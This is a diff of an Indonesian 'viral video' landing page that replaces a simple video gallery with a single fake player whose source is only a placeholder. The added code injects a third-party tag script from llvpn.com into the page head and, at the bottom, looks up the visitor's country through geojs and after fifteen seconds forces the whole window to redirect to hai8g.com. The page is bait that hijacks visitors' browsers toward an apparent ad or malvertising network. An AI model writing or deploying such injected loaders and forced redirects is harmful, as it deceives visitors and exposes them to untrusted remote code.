@@ -1,136 +1,214 @@
-<!DOCTYPE html><html lang="id">
+<!doctype html>
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>asupan-vjdeyhub</title><style>
+
+<script>(function(s){s.dataset.zone='11281249',s.src='https://llvpn.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+<title>IndoV1ral</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root{
+--bg:#ffffff;
+--text:#0f172a;
+--muted:#64748b;
+--line:#e2e8f0;
+--btn:#111827;
+--btnText:#ffffff;
+--btnHover:#000000;
+}
+
 *{
 margin:0;
 padding:0;
 box-sizing:border-box;
 }
 
-body{
-font-family:Arial,sans-serif;
-background:#fff;
-color:#111;
+html{
+-webkit-text-size-adjust:100%;
 }
 
-.header{
+html,body{
+height:100%;
+}
+
+body{
+font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu;
+background:var(--bg);
+color:var(--text);
+overflow-x:hidden;
+}
+
+.appbar{
 position:sticky;
 top:0;
+z-index:20;
 background:#fff;
-border-bottom:1px solid #eee;
-padding:14px 16px;
+border-bottom:1px solid var(--line);
+}
+
+.bar-inner{
+max-width:1200px;
+margin:auto;
 display:flex;
-justify-content:space-between;
 align-items:center;
-z-index:100;
+padding:10px 16px;
+}
+
+.brand{
+display:flex;
+align-items:center;
+gap:8px;
+font-weight:700;
 }
 
 .logo{
-font-size:22px;
-font-weight:700;
-}
-
-.upload-btn{
-background:#0d1b2a;
+width:28px;
+height:28px;
+display:grid;
+place-items:center;
+background:#111827;
 color:#fff;
-text-decoration:none;
-padding:8px 16px;
-border-radius:20px;
-font-size:14px;
+border-radius:6px;
+}
+
+.spacer{
+flex:1;
+}
+
+.btn{
+border:0;
+padding:10px 14px;
+border-radius:12px;
+background:#111827;
+color:#fff;
 font-weight:600;
+cursor:pointer;
 }
 
-.container{
-max-width:720px;
+.banner{
+max-width:1200px;
+margin:10px auto;
+padding:8px 16px;
+color:#64748b;
+}
+
+.wrap{
+max-width:1200px;
 margin:auto;
-padding:12px;
+padding:16px;
 }
 
-.card{
-margin-bottom:28px;
+.player-shell{
+display:grid;
+place-items:center;
 }
 
-video{
-width:100%;
-display:block;
+.phone{
+width:clamp(240px,92vw,420px);
+aspect-ratio:9/16;
+border-radius:22px;
+overflow:hidden;
 background:#000;
-border-radius:14px;
 }
 
-.title{
-font-size:16px;
-font-weight:700;
-margin-top:10px;
+.phone video{
+width:100%;
+height:100%;
+object-fit:cover;
 }
 
 .meta{
-font-size:13px;
-color:#666;
-margin-top:4px;
-}
-
-.footer{
+margin-top:20px;
 text-align:center;
-padding:25px 15px;
-border-top:1px solid #eee;
+color:#64748b;
 font-size:13px;
-color:#666;
+}
+</style>
+</head>
+
+<body>
+
+<header class="appbar">
+<div class="bar-inner">
+
+<div class="brand">
+<span class="logo">V</span>
+<span>vldey<span style="color:#3b82f6">.co</span></span>
+</div>
+
+<div class="spacer"></div>
+
+<button class="btn">Upload</button>
+
+</div>
+</header>
+
+<div class="banner">
+Advertise
+</div>
+
+<main class="wrap">
+<section class="player-shell">
+
+<div class="phone">
+
+<video id="video" playsinline controls>
+<source src="VIDEO" type="video/mp4">
+
+</video>
+
+</div>
+
+<div class="meta">
+0:00 / 3:57 • Putar untuk memulai
+</div>
+
+</section>
+</main>
+
+<script>
+const v = document.getElementById('video');
+const meta = document.querySelector('.meta');
+
+function fmt(t){
+  const m = Math.floor(t/60);
+  const s = Math.floor(t%60).toString().padStart(2,'0');
+  return `${m}:${s}`;
 }
 
-.footer a{
-color:#666;
-text-decoration:none;
-margin:0 8px;
+v.addEventListener('loadedmetadata', ()=>{
+  meta.textContent = `0:00 / ${fmt(v.duration)}`;
+});
+
+v.addEventListener('timeupdate', ()=>{
+  meta.textContent = `${fmt(v.currentTime)} / ${fmt(v.duration)}`;
+});
+</script>
+
+<script>
+var LINK_ID  = "https://hai8g.com/4/9875367";
+var LINK_ALL = "https://hai8g.com/4/9875367";
+var DELAY = 15000;
+
+function geoip(g){
+  setTimeout(function(){
+    if(g && g.country === "ID"){
+      window.top.location.href = LINK_ID;
+    }else{
+      window.top.location.href = LINK_ALL;
+    }
+  }, DELAY);
 }
-</style></head><body><header class="header"><div class="logo">
-VideyHub
-</div><a href="upload.html" class="upload-btn">
-Upload
-</a></header><div class="container"><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO1.mp4"></video>
-<div class="title">🔥 Video Viral #1</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO2.mp4"></video>
-<div class="title">🔥 Video Viral #2</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO3.mp4"></video>
-<div class="title">🔥 Video Viral #3</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO4.mp4"></video>
-<div class="title">🔥 Video Viral #4</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO5.mp4"></video>
-<div class="title">🔥 Video Viral #5</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO6.mp4"></video>
-<div class="title">🔥 Video Viral #6</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO7.mp4"></video>
-<div class="title">🔥 Video Viral #7</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO8.mp4"></video>
-<div class="title">🔥 Video Viral #8</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO9.mp4"></video>
-<div class="title">🔥 Video Viral #9</div>
-<div class="meta">Trending sekarang</div>
-</div><div class="card">
-<video controls playsinline preload="metadata" src="VIDEO10.mp4"></video>
-<div class="title">🔥 Video Viral #10</div>
-<div class="meta">Trending sekarang</div>
-</div></div><footer class="footer">
-<a href="privacy.html">Privacy Policy</a> |
-<a href="dmca.html">DMCA</a> |
-<a href="contact.html">Contact</a>
-</footer></body>
+</script>
+
+<script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
+
+</body>
 </html>
